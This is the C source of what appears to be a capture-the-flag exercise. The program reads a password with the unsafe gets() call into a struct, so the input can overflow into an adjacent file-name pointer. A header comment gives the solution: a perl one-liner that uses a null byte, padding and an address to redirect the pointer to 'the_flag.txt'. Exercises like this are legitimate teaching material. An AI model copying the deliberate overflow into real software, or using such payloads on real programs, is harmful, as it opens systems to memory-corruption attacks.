/*
** Solution
** strlen("not_the_flag.txt") - strlen("flag.txt) -> 8
** file_name = 0x08048777 -> "not_the_flag.txt"
** file_name += 8;
** file_name = 0x0804877F -> "the_flag.txt"
** perl -e 'print "1337_P455W0RD" . "\x00" . "AA" ."\x7f\x87\x04\x08"  | ./what_the_flag  
*/


#include <stdlib.h>
#include <stdio.h>

struct message_data{
    char message[128];
    char password[16];
    char *file_name;
};

void read_file(char *buf, char *file_path, size_t len){
    FILE *file;
    if(file= fopen(file_path, "r")){
        fgets(buf, len, file);
        fclose(file);
    }else{
        sprintf(buf, "Cannot read file: %s", file_path);
    }
}

int main(int argc, char **argv){
    struct message_data data;
    data.file_name = "not_the_flag.txt";

    puts("Enter your password too see the message:");
    gets(data.password);

    if(!strcmp(data.password, "1337_P455W0RD")){
        read_file(data.message, data.file_name, sizeof(data.message));
        puts(data.message);
    }else{
        puts("Incorrect password!");
    }

    return 0;
}
